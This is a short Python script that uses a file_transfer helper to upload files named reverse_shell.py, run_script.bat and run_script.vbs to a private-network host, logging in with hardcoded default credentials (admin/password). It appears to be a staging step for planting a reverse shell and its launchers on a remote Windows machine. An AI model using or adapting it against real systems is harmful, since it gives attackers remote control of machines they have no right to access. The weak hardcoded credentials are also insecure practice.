# example_transfer.py
from file_transfer import upload_files

def main():
    ip_address = '192.168.0.105'
    username = 'admin'
    password = 'password'
    domain = 'WORKGROUP'
    file_paths = ['reverse_shell.py', 'run_script.bat', 'run_script.vbs']
    upload_files(ip_address, username, password, domain, file_paths)

if __name__ == "__main__":
    main()